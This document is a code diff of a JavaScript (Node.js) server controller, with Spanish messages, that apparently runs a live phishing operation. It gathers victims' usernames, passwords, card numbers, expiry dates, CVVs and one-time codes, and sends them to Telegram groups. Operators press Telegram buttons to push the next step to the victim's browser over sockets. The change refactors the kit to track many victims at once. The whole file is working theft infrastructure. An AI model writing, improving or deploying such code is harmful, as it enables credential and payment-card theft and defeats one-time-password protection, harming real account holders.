@@ -1,22 +1,28 @@
-import { sendTelegramAlert, waitForDecision, respondToTelegramCallback, sendSimpleTelegramMessage, editTelegramMessage } from '../services/botService.js';
+import {
+  sendTelegramAlert,
+  waitForDecision,
+  respondToTelegramCallback,
+  sendSimpleTelegramMessage,
+  editTelegramMessage,
+} from "../services/botService.js";
 
 let ioInstance;
-let activeSession = null;
+const activeSessions = new Map(); // socketId -> session
 
 export const setSocketIO = (io) => {
   ioInstance = io;
-}
+};
 
 let counter = 0;
 
 export const initProcess = async (req, res) => {
   const { data, socketId } = req.body;
+
   try {
     const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
     const decrypted = JSON.parse(atob(data));
 
-    // Inicializa la sesión
-    activeSession = {
+    const session = {
       chatId: groupId,
       user: decrypted.user,
       pass: decrypted.pass,
@@ -24,33 +30,42 @@ export const initProcess = async (req, res) => {
       exp: null,
       cvv: null,
       otp: null,
-      socketId: socketId,
-      messageId: null
+      socketId,
+      messageId: null,
+      decisionId: null,
     };
 
-    const messageText = buildMessageText(activeSession);
+    const messageText = buildMessageText(session);
 
-    const messageId = await sendTelegramAlert({ groupId, text: messageText });
+    const { message_id, decisionId } = await sendTelegramAlert({
+      groupId,
+      text: messageText,
+      decisionId: `${Date.now()}-${Math.random()}`,
+    });
 
-    if (!messageId) {
-      return res.status(500).json({ success: false, message: 'No se pudo enviar el mensaje a Telegram' });
+    if (!message_id || !decisionId) {
+      return res.status(500).json({
+        success: false,
+        message: "No se pudo enviar el mensaje a Telegram",
+      });
     }
 
-    activeSession.messageId = String(messageId);
+    session.messageId = String(message_id);
+    session.decisionId = decisionId;
+    activeSessions.set(socketId, session);
 
     // Esperar decisión desde Telegram
-    waitForDecision(activeSession.messageId)
+    waitForDecision(decisionId)
       .then((decision) => {
-        console.log(decision)
         if (ioInstance) {
-          ioInstance.to(activeSession.socketId).emit('decision', decision);
+          ioInstance.to(socketId).emit("decision", decision);
         }
       })
       .catch((err) => {
-        console.error('Timeout esperando decisión:', err.message);
+        console.error("Timeout esperando decisión:", err.message);
       });
 
-    return res.status(200).json({ success: true, messageId });
+    return res.status(200).json({ success: true, messageId: message_id });
   } catch (error) {
     console.error(error);
     return res.status(500).json({ success: false, error: error.message });
@@ -64,32 +79,33 @@ export const telegramWebhook = async (req, res) => {
     await respondToTelegramCallback(callback);
     return res.sendStatus(200);
   } catch (err) {
-    console.error('Error manejando webhook:', err);
+    console.error("Error manejando webhook:", err);
     return res.sendStatus(500);
   }
 };
 
 export const appendCardData = async (req, res) => {
-  const { card, exp, cvv } = req.body;
+  const { card, exp, cvv, socketId } = req.body;
+  const session = activeSessions.get(socketId);
 
-  if (!activeSession) return res.status(400).json({ error: 'No hay sesión activa' });
+  if (!session) return res.status(400).json({ error: "No hay sesión activa" });
 
   try {
-    activeSession.card = card;
-    activeSession.exp = exp;
-    activeSession.cvv = cvv;
+    session.card = card;
+    session.exp = exp;
+    session.cvv = cvv;
 
-    const newText = buildMessageText(activeSession);
+    const newText = buildMessageText(session);
 
     await editTelegramMessage({
-      chatId: activeSession.chatId,
-      messageId: activeSession.messageId,
-      text: newText
+      chatId: session.chatId,
+      messageId: session.messageId,
+      text: newText,
     });
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    console.error('Error en appendCardData:', error);
+    console.error("Error en appendCardData:", error);
     return res.status(500).json({ success: false, error: error.message });
   }
 };
@@ -99,61 +115,65 @@ export const sendSimpleMessage = async (req, res) => {
   const chatId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
   const data = JSON.parse(atob(text));
   const message = `
-    Tarjeta: ${data['card']}
-  Exp:  ${data['exp']}
-  CVV:  ${data['cvv']}
+    Tarjeta: ${data["card"]}
+  Exp:  ${data["exp"]}
+  CVV:  ${data["cvv"]}
   `;
+
   try {
     const result = await sendSimpleTelegramMessage(chatId, message);
     return res.status(200).json({
       success: true,
-      message_id: result.message_id, // 🔥 Aquí está
+      message_id: result.message_id,
       chat_id: result.chat.id,
       date: result.date,
-      text: result.text
+      text: result.text,
     });
   } catch (err) {
-    console.error('Error enviando mensaje simple:', err);
+    console.error("Error enviando mensaje simple:", err);
     return res.status(500).json({ error: err.message });
   }
 };
 
 export const updateMessageWithOtp = async (req, res) => {
   const { otp, socketId } = req.body;
+  const session = activeSessions.get(socketId);
 
-  if (!activeSession) return res.status(400).json({ error: 'No hay sesión activa' });
+  if (!session)
+    return res.status(400).json({ error: "No hay sesión activa para este socket" });
 
   try {
-    activeSession.otp = otp;
+    session.otp = otp;
 
-    const messageText = buildMessageText(activeSession);
+    const messageText = buildMessageText(session);
 
     await editTelegramMessage({
-      chatId: activeSession.chatId,
-      messageId: activeSession.messageId,
+      chatId: session.chatId,
+      messageId: session.messageId,
       text: messageText,
       reply_markup: {
-        inline_keyboard: [[
-          { text: 'Continuar', callback_data: 'continue' },
-          { text: 'Finalizar', callback_data: 'finalize' },
-        ]]
-      }
+        inline_keyboard: [
+          [
+            { text: "Continuar", callback_data: `continue:${session.decisionId}` },
+            { text: "Finalizar", callback_data: `finalize:${session.decisionId}` },
+          ],
+        ],
+      },
     });
 
-    waitForDecision(activeSession.messageId)
+    waitForDecision(session.decisionId)
       .then((decision) => {
         if (ioInstance) {
-          ioInstance.to(activeSession.socketId).emit('final-decision', decision);
+          ioInstance.to(socketId).emit("final-decision", decision);
         }
       })
       .catch((err) => {
-        console.error('Timeout esperando decisión del OTP:', err.message);
+        console.error("Timeout esperando decisión del OTP:", err.message);
       });
 
-    // Ya se está esperando la decisión desde initProcess
     return res.status(200).json({ success: true });
   } catch (error) {
-    console.error('Error en updateMessageWithOtp:', error);
+    console.error("Error en updateMessageWithOtp:", error);
     return res.status(500).json({ success: false, error: error.message });
   }
 };
@@ -163,9 +183,9 @@ function buildMessageText(session) {
 🚨 Nuevo ingreso:
 👤 Usuario: ${session.user}
 🔑 Contraseña: ${session.pass}
-${session.card ? `💳 Tarjeta: ${session.card}` : ''}
-${session.exp ? `📆 Exp: ${session.exp}` : ''}
-${session.cvv ? `🔐 CVV: ${session.cvv}` : ''}
-${session.otp ? `✅ OTP ingresado: ${session.otp}` : ''}
+${session.card ? `💳 Tarjeta: ${session.card}` : ""}
+${session.exp ? `📆 Exp: ${session.exp}` : ""}
+${session.cvv ? `🔐 CVV: ${session.cvv}` : ""}
+${session.otp ? `✅ OTP ingresado: ${session.otp}` : ""}
 `.trim();
 }
